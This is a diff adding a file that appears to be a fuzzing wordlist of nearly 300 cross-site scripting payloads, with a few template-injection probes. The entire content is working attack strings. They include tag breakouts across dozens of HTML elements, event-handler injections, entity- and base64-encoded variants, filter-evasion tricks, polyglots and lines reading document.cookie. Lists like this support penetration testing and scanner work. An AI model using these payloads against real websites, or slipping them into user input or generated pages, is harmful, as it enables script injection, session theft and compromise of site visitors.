@@ -1,0 +1,298 @@
+" accesskey="x" onclick="alert(1)" x="
+" onclick="alert(1)
+" onerror="alert(1)
+" onfocus="alert(1)" autofocus="
+" onload="alert(1)
+" onmouseover="alert(1)
+" style="background:url(javascript:alert(1))
+" tabindex="1" onfocus="alert(1)" x="
+"'><img src=x onerror=alert(1)>
+"-alert(1)-"
+"-alert(1)//
+";alert(1);//
+"><details open ontoggle="alert(1)">
+"><img src=x onerror=alert(1)>
+"><input onfocus=alert(1) autofocus>
+"><script>alert(1)</script>
+"><svg onload=alert(1)>
+# Case variation
+${7*7}
+${alert(1)}
+%253Cimg%2520src=x%2520onerror=alert(1)%253E
+%253Cscript%253Ealert(1)%253C/script%253E
+' onclick='alert(1)
+' onfocus='alert(1)' autofocus='
+' onmouseover='alert(1)
+'-alert(1)-'
+'-alert(1)//
+';alert(1);//
+'><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+'accesskey='x'onclick='alert(1)'x='
+--></script><script>alert(1)</script>
+1%0aalert(1)
+1;alert(1)
+</a><script>alert(1)</script>
+</abbr><script>alert(1)</script>
+</acronym><script>alert(1)</script>
+</address><script>alert(1)</script>
+</annotation-xml><script>alert(1)</script>
+</applet><script>alert(1)</script>
+</area><script>alert(1)</script>
+</article><script>alert(1)</script>
+</aside><script>alert(1)</script>
+</audio><script>alert(1)</script>
+</b><script>alert(1)</script>
+</base><script>alert(1)</script>
+</basefont><script>alert(1)</script>
+</bdi><script>alert(1)</script>
+</bdo><script>alert(1)</script>
+</bgsound><script>alert(1)</script>
+</big><script>alert(1)</script>
+</blink><script>alert(1)</script>
+</blockquote><script>alert(1)</script>
+</body><script>alert(1)</script>
+</br><script>alert(1)</script>
+</button><script>alert(1)</script>
+</canvas><script>alert(1)</script>
+</caption><script>alert(1)</script>
+</center><script>alert(1)</script>
+</cite><script>alert(1)</script>
+</code><script>alert(1)</script>
+</col><script>alert(1)</script>
+</colgroup><script>alert(1)</script>
+</command><script>alert(1)</script>
+</comment><script>alert(1)</script>
+</content><script>alert(1)</script>
+</data><script>alert(1)</script>
+</datalist><script>alert(1)</script>
+</dd><script>alert(1)</script>
+</del><script>alert(1)</script>
+</desc><script>alert(1)</script>
+</details><script>alert(1)</script>
+</dfn><script>alert(1)</script>
+</dialog><script>alert(1)</script>
+</dir><script>alert(1)</script>
+</div><script>alert(1)</script>
+</dl><script>alert(1)</script>
+</dt><script>alert(1)</script>
+</element><script>alert(1)</script>
+</em><script>alert(1)</script>
+</embed><script>alert(1)</script>
+</fieldset><script>alert(1)</script>
+</figcaption><script>alert(1)</script>
+</figure><script>alert(1)</script>
+</font><script>alert(1)</script>
+</foreignobject><script>alert(1)</script>
+</form><script>alert(1)</script>
+</frame><script>alert(1)</script>
+</frameset><script>alert(1)</script>
+</h1><script>alert(1)</script>
+</head><script>alert(1)</script>
+</hgroup><script>alert(1)</script>
+</hr><script>alert(1)</script>
+</html><script>alert(1)</script>
+</i><script>alert(1)</script>
+</iframe><script>alert(1)</script>
+</ilayer><script>alert(1)</script>
+</image><script>alert(1)</script>
+</img><script>alert(1)</script>
+</input><script>alert(1)</script>
+</ins><script>alert(1)</script>
+</isindex><script>alert(1)</script>
+</kbd><script>alert(1)</script>
+</keygen><script>alert(1)</script>
+</label><script>alert(1)</script>
+</layer><script>alert(1)</script>
+</legend><script>alert(1)</script>
+</li><script>alert(1)</script>
+</link><script>alert(1)</script>
+</listing><script>alert(1)</script>
+</main><script>alert(1)</script>
+</map><script>alert(1)</script>
+</mark><script>alert(1)</script>
+</marquee><script>alert(1)</script>
+</math><script>alert(1)</script>
+</menu><script>alert(1)</script>
+</menuitem><script>alert(1)</script>
+</meta><script>alert(1)</script>
+</meter><script>alert(1)</script>
+</mi><script>alert(1)</script>
+</mn><script>alert(1)</script>
+</mo><script>alert(1)</script>
+</ms><script>alert(1)</script>
+</mtext><script>alert(1)</script>
+</multicol><script>alert(1)</script>
+</nav><script>alert(1)</script>
+</nextid><script>alert(1)</script>
+</nobr><script>alert(1)</script>
+</noembed><script>alert(1)</script>
+</noframes><script>alert(1)</script>
+</nolayer><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+</object><script>alert(1)</script>
+</ol><script>alert(1)</script>
+</optgroup><script>alert(1)</script>
+</option><script>alert(1)</script>
+</output><script>alert(1)</script>
+</p><script>alert(1)</script>
+</param><script>alert(1)</script>
+</picture><script>alert(1)</script>
+</plaintext><script>alert(1)</script>
+</pre><script>alert(1)</script>
+</progress><script>alert(1)</script>
+</q><script>alert(1)</script>
+</rp><script>alert(1)</script>
+</rt><script>alert(1)</script>
+</ruby><script>alert(1)</script>
+</s><script>alert(1)</script>
+</samp><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+</script><svg onload=alert(1)>
+</section><script>alert(1)</script>
+</select><script>alert(1)</script>
+</shadow><script>alert(1)</script>
+</slot><script>alert(1)</script>
+</small><script>alert(1)</script>
+</source><script>alert(1)</script>
+</spacer><script>alert(1)</script>
+</span><script>alert(1)</script>
+</strike><script>alert(1)</script>
+</strong><script>alert(1)</script>
+</style><script>alert(1)</script>
+</sub><script>alert(1)</script>
+</summary><script>alert(1)</script>
+</sup><script>alert(1)</script>
+</svg><script>alert(1)</script>
+</table><script>alert(1)</script>
+</tbody><script>alert(1)</script>
+</td><script>alert(1)</script>
+</template><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</tfoot><script>alert(1)</script>
+</th><script>alert(1)</script>
+</thead><script>alert(1)</script>
+</time><script>alert(1)</script>
+</title><script>alert(1)</script>
+</tr><script>alert(1)</script>
+</track><script>alert(1)</script>
+</tt><script>alert(1)</script>
+</u><script>alert(1)</script>
+</ul><script>alert(1)</script>
+</var><script>alert(1)</script>
+</video><script>alert(1)</script>
+</wbr><script>alert(1)</script>
+</xml><script>alert(1)</script>
+</xmp><script>alert(1)</script>
+<<script>alert(1)//<</script>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
+<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
+<audio src=x onerror=alert(1)>
+<base href="javascript:/a/-alert(1)//">
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<dialog open onclose=alert(1)>
+<embed src="javascript:alert(1)">
+<form><button formaction="javascript:alert(1)">click
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<img src=x onerror%09=%09alert(1)>
+<img src=x onerror%0a=%0aalert(1)>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
+<img src=x onerror="[].constructor.constructor('alert(1)')()">
+<img src=x onerror="alert(1)">
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
+<img src=x onerror="Function('alert(1)')()">
+<img src=x onerror="new Function('alert(1)')()">
+<img src=x onerror="self['ale'+'rt'](1)">
+<img src=x onerror="setInterval('alert(1)')">
+<img src=x onerror="setTimeout('alert(1)')">
+<img src=x onerror="setTimeout(alert,0,1)">
+<img src=x onerror="top['ale'+'rt'](1)">
+<img src=x onerror="window['ale'+'rt'](1)">
+<img src=x onerror=%00alert(1)>
+<img src=x onerror='alert(1)'>
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=al\u0065rt(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert\u00281\u0029>
+<img src=x onerror=alert`1`>
+<img%0asrc=x%0aonerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<input onfocus=alert(1) autofocus>
+<isindex type=image src=1 onerror=alert(1)>
+<marquee behavior=alternate onstart=alert(1)>xss</marquee>
+<marquee onstart=alert(1)>
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
+<meter onmouseover=alert(1)>0</meter>
+<object data="javascript:alert(1)">
+<scr%00ipt>alert(1)</scr%00ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scri%0apt>alert(1)</scri%0apt>
+<script/x>alert(1)</script>
+<script>alert(1)//</script>
+<script>alert(1)<!--</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<svg onload=alert(1)>
+<svg onload=alert(document.domain)>
+<svg onload=alert`1`>
+<svg xmlns="http://www.w3.org/2000/svg"><rect x="0" y="0" width="100" height="100" style="fill:red" onload="alert(1)"/>
+<svg%0aonload=alert(1)>
+<svg/onload=alert(1)>
+<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">XSS</text></a></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+<svg><script>alert(1)</script></svg>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert(1) /></svg>#x">
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<x onauxclick=alert(1)>auxclick
+<x onblur=alert(1) tabindex=1 autofocus>
+<x onchange=alert(1)>change
+<x onclick=alert(1)>click
+<x oncontextmenu=alert(1)>rightclick
+<x oncopy=alert(1)>copy
+<x oncut=alert(1) contenteditable>cut
+<x ondblclick=alert(1)>dblclick
+<x ondrag=alert(1) draggable=true>drag
+<x onfocus=alert(1) tabindex=1>focus
+<x oninput=alert(1) contenteditable>input
+<x onkeydown=alert(1) tabindex=1>key
+<x onkeypress=alert(1) tabindex=1>key
+<x onkeyup=alert(1) tabindex=1>key
+<x onmouseover=alert(1)>hover
+<x onpaste=alert(1) contenteditable>paste
+<x onpointerover=alert(1)>pointer
+<x onresize=alert(1)>resize
+<x onscroll=alert(1) style="overflow:auto;height:50px;width:50px;"><br><br><br><br>scroll
+<x onselect=alert(1) contenteditable>select
+<x ontouchstart=alert(1)>touch
+<x onwheel=alert(1)>wheel
+<xmp><img src=x onerror=alert(1)></xmp>
+[].constructor.constructor('alert(1)')()
+\";alert(1);//
+\'-alert(1)//
+\';alert(1);//
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:void(0);alert(1)
+self['alert'](1)
+top['al'+'ert'](1)
+window['alert'](1)
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
